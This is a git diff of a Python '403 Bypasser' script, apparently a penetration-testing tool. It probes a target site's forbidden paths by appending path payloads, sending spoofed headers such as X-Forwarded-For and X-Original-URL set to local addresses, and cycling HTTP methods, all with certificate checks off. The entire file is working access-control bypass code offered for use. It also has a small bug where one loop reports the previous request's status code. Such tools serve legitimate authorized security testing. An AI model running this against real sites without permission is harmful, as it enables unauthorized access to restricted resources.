@@ -1,9 +1,12 @@
 import requests
 import warnings
 import argparse
-from modules.payloads.url_payloads import payloads
-from modules.utilities.fuzzer_outputs import url_fuzzer_output, http_method_fuzzer_output
-
+from modules.payloads.url_payloads import non_in_between_payloads, in_between_payloads
+from modules.payloads.http_methods import http_methods
+from modules.payloads.headers import headers
+from modules.payloads.local_ip_addresses import addresses
+from modules.payloads.url_rewrite_headers import url_rewrite_headers
+from modules.utilities.fuzzer_outputs import url_fuzzer_output, http_method_fuzzer_output, header_fuzzer_output
 
 
 print("""\u001b[36m
@@ -22,89 +25,54 @@ warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 parser = argparse.ArgumentParser(description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p /admin -x .pdf")
 parser.add_argument('-u', '--url' , help = 'Provide url ' , required=True)
 parser.add_argument('-p' , '--path' , help = 'Provide the path (ex. /admin)' , required=True)
+parser.add_argument('-q' , '--query' , help = 'Provide query string (ex. id=1) [optional]' , required=False)
 parser.add_argument('-x' , '--extension' , help = 'Provide extra payload/extension [optional]' , required=False)
 args = parser.parse_args()
 
 url = args.url.rstrip('/')
-path = args.path
+path = args.path.lstrip('/')
 extension = args.extension
+query_string = args.query
 
 full_url = url+'/'+path
 slash_path = '/'+path
 
+full_payload_list = non_in_between_payloads + in_between_payloads
+
 print("Target URL: ", url)
 
-# TODO - Implement code reuse
 print("\n", "Fuzzing via URL....", "\n")
-for payload in payloads:
-	try:
+
+for payload in in_between_payloads:
 		full_url2 = url+slash_path+payload
-		req = requests.get(full_url2, allow_redirects=False , verify = False , timeout = 5)
+		req = requests.get(full_url2, allow_redirects=False , verify = False , timeout = 5, params = query_string)
 		url_fuzzer_output(full_url2, str(req.status_code))
-
-	except Exception:
-		pass
-
-for payload in payloads:
-	try:
+	
+for payload in non_in_between_payloads:
 		full_url3 = url+payload+path
-		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5)
+		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5, params = query_string)
 		url_fuzzer_output(full_url3, str(req.status_code))
 
-	except Exception:
-		pass
-
-for payload in payloads:
-	try:
-		full_url4 = url+slash_path+payload+extension
-		req = requests.get(full_url4 , allow_redirects=False , verify = False , timeout = 5)
-		url_fuzzer_output(full_url4, str(req.status_code))
-
-	except Exception:
-		pass
-
-# TODO - Implement code reuse, put header payloads to a list then iterate them in a loop
+if (extension != None):
+	for payload in full_payload_list:
+		
+			full_url4 = url + slash_path + payload + extension
+			req = requests.get(full_url4, allow_redirects=False , verify = False , timeout = 5, params = query_string)
+			url_fuzzer_output(full_url4, str(req.status_code))
+			
 print("\n", "Fuzzing via HTTP Headers....", "\n")
-r1 = requests.get(full_url, headers={"X-Original-URL":path} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r1.status_code)) != '404'):
-	print(full_url + ' : ' +"(X-Original-URL: "+ path + ')' + ' : ' + str(r1.status_code))
 
-r2 = requests.get(full_url, headers={"X-Custom-IP-Authorization" : "127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r2.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Custom-IP-Authorization: 127.0.0.1" + ')'+ ' : ' + str(r2.status_code))
+for rewrite_header in url_rewrite_headers:
+	req = requests.get(full_url, headers={rewrite_header:slash_path}, allow_redirects=False , verify=False , timeout=5)
+	header_fuzzer_output(full_url, str(req.status_code), rewrite_header, slash_path)
 
-r3 = requests.get(full_url, headers={"X-Forwarded-For": "http://127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r3.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Forwarded-For: http://127.0.0.1" + ')'+ ' : ' + str(r3.status_code))
-
-r4 = requests.get(full_url, headers={"X-Forwarded-For": "127.0.0.1:80"} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r4.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Forwarded-For: 127.0.0.1:80" + ')'+ ' : ' + str(r4.status_code))
-
-r5 = requests.get(url, headers={"X-rewrite-url": slash_path} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r5.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-rewrite-url: {}".format(slash_path) + ')'+ ' : ' + str(r5.status_code))
-
-r6 = requests.get(full_url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r6.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Forwarded-Host:127.0.0.1" + ')'+ ' : ' + str(r6.status_code))
-
-r7 = requests.get(full_url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r7.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Host:127.0.0.1" + ')'+ ' : ' + str(r7.status_code))
-
-r8 = requests.get(full_url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r8.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Remote-IP:127.0.0.1" + ')'+ ' : ' + str(r8.status_code))
-
-r9 = requests.get(full_url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
-if ((str(r9.status_code)) != '404'):
-	print(full_url + ' : ' + "(X-Originating-IP:127.0.0.1" + ')'+ ' : ' + str(r9.status_code))
-
+for header in headers:
+	for address in addresses:
+		req = requests.get(full_url, headers={header:address}, allow_redirects=False , verify=False , timeout=5, params = query_string)	
+		header_fuzzer_output(full_url, str(req.status_code), header, address)
 
 print("\n", "Fuzzing via HTTP Methods....", "\n")
-with open('./modules/payloads/http_methods.txt') as methods:
-	for method in methods:
-		method = method.strip('\n')
-		request = requests.request("{}".format(method), full_url, allow_redirects=False, verify=False, timeout= 5)
-		http_method_fuzzer_output(full_url, str(request.status_code), method)
+
+for method in http_methods:
+	request = requests.request("{}".format(method), full_url, allow_redirects=False, verify=False, timeout= 5, params = query_string)
+	http_method_fuzzer_output(full_url, str(request.status_code), method)
